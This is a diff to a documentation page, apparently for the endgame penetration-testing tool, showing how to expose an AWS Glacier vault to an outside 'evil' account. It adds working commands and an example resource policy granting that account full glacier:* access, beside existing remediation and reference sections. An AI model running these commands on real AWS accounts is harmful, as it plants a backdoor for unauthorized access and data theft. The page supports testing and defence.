@@ -2,9 +2,44 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service glacier --name test-resource-exposure
+```
+
+* To view the contents of the Glacier Vault Access Policy, run the following:
+
+```bash
+export VICTIM_ACCOUNT_ID=111122223333
+
+aws glacier get-vault-access-policy \
+    --account-id $VICTIM_ACCOUNT_ID \
+    --vault-name test-resource-exposure
+```
+
+* Observe that the output of the overly permissive Glacier Vault Access Policies resembles the example shown below.
+
+
 ## Example
 
+Observe that the policy below allows the evil principal (`arn:aws:iam::999988887777:user/evil`) the `glacier:*` permissions to the Glacier Vault named `test-resource-exposure`.
+
+```json
+{
+    "policy": {
+        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"glacier:*\",\"Resource\":\"arn:aws:glacier:us-east-1:111122223333:vaults/test-resource-exposure\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:user/evil\"},\"Action\":\"glacier:*\",\"Resource\":\"arn:aws:glacier:us-east-1:111122223333:vaults/test-resource-exposure\"}]}"
+    }
+}
+```
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
@@ -22,3 +57,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 ## References
 
 * [set-vault-access-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/glacier/set-vault-access-policy.html)
+* [get-vault-access-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/glacier/get-vault-access-policy.html)
